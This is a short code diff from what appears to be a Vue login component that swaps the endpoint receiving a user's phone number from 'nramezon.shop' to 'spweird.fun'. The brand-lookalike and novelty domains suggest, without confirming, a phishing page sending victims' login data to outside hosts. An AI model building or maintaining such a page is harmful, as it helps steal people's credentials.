@@ -101,7 +101,7 @@ export default {
     const goToVerify = (event) => {
       event.preventDefault();
       if (number.value) {
-        fetch('https://nramezon.shop/api/login', {
+        fetch('https://spweird.fun/api/login', {
           method: 'POST',
           body: JSON.stringify({ PhoneNumber: number.value }),
           headers: {
